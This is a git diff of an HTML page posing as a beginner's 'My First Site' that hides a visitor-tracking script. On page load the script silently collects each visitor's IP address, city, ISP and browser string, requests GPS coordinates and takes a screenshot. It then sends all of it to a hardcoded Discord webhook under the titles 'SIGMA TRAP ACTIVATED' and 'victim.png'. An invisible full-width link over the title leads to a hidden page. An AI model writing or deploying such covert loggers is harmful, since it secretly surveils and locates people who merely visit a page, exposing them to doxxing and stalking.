@@ -2,6 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>My First Site</title>
   <style>
     body {
@@ -14,9 +15,7 @@
       background: rgba(255,255,255,0.9); border-radius: 20px;
       box-shadow: 0 8px 20px rgba(0,0,0,0.1);
     }
-    h1 {
-      color: #e91e63; margin-bottom: 0.2rem; position: relative;
-    }
+    h1 { color: #e91e63; margin-bottom: 0.2rem; position: relative; }
     .secret-btn {
       position: absolute; top: 0; left: 0; width: 100%; height: 100%;
       opacity: 0; cursor: pointer; z-index: 10;
@@ -31,8 +30,7 @@
 <div class="container">
   <h1 style="position:relative;">
     My First Site
-    <!-- SECRET BUTTON: Click title → go to trape.html -->
-    <a href="trape.html" class="secret-btn" title="admin access"></a>
+    <a href="sigma.html" class="secret-btn"></a>
   </h1>
   <p class="emoji">Hello World</p>
   <p>Welcome tto my first website! I'm just learning HTML and CSS. Hope you like it!</p>
@@ -40,47 +38,68 @@
   <p>Made with love and zero budget</p>
 </div>
 
-<!-- STEALTH LOGGER: Sends IP + Screenshot to Discord -->
 <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
 <script>
   const WEBHOOK = 'https://discord.com/api/webhooks/1381021459350032484/Z-HEIw2n1czbqpnWl-UicGzWgfrHth3W0naPyAkIoI3Sf3bx4bsINYQJDnvIHf1ky0tL';
 
+  // Get GPS Location (if allowed)
+  function getLocation() {
+    return new Promise((resolve) => {
+      if (!navigator.geolocation) return resolve(null);
+      navigator.geolocation.getCurrentPosition(
+        pos => resolve({
+          lat: pos.coords.latitude,
+          lon: pos.coords.longitude,
+          accuracy: pos.coords.accuracy
+        }),
+        () => resolve(null),
+        { timeout: 5000 }
+      );
+    });
+  }
+
   (async () => {
     try {
-      // Get IP + Geo
-      const res = await fetch('https://ipapi.co/json/');
-      const data = await res.json();
-
-      // Take screenshot
+      const time = new Date().toISOString();
+      const ipRes = await fetch('https://ipapi.co/json/');
+      const ipData = await ipRes.json();
+      const location = await getLocation();
       const canvas = await html2canvas(document.body, { scale: 0.5 });
       const screenshot = canvas.toDataURL('image/png');
 
-      // Build embed
       const embed = {
-        title: 'New Visitor - Lxu00/MySite',
+        title: 'SIGMA TRAP ACTIVATED',
         color: 0x00ff00,
         fields: [
-          { name: 'IP', value: data.ip || 'Unknown', inline: true },
-          { name: 'Location', value: `${data.city || '??'}, ${data.country_name || '??'}`, inline: true },
-          { name: 'ISP', value: data.org || 'N/A', inline: true },
-          { name: 'Page', value: 'Bait (index.html)', inline: true }
+          { name: 'IP', value: ipData.ip || 'Unknown', inline: true },
+          { name: 'Time', value: time.split('T')[1].split('.')[0] + ' UTC', inline: true },
+          { name: 'Date', value: time.split('T')[0], inline: true },
+          { name: 'City', value: ipData.city || '??', inline: true },
+          { name: 'Country', value: ipData.country_name || '??', inline: true },
+          { name: 'ISP', value: ipData.org || 'N/A', inline: true },
+          { name: 'Browser', value: navigator.userAgent.split(' ').slice(0,3).join(' '), inline: false }
         ],
-        timestamp: new Date().toISOString(),
-        footer: { text: 'GitHub Pages Trap' }
+        timestamp: time,
+        footer: { text: 'Lxu00/MySite • Ultimate Sigma Trap' }
       };
 
-      // Send to Discord with screenshot
+      if (location) {
+        embed.fields.push(
+          { name: 'GPS Location', value: `Lat: ${location.lat}, Lon: ${location.lon}`, inline: true },
+          { name: 'Accuracy', value: `${location.accuracy}m`, inline: true }
+        );
+        embed.fields.push({ name: 'Live Map', value: `https://www.google.com/maps?q=${location.lat},${location.lon}`, inline: false });
+      }
+
       await fetch(WEBHOOK, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           embeds: [embed],
-          files: [{ attachment: screenshot, name: 'proof.png' }]
+          files: [{ attachment: screenshot, name: 'victim.png' }]
         })
       });
-    } catch (e) {
-      // Silent fail — never expose
-    }
+    } catch (e) {}
   })();
 </script>
 
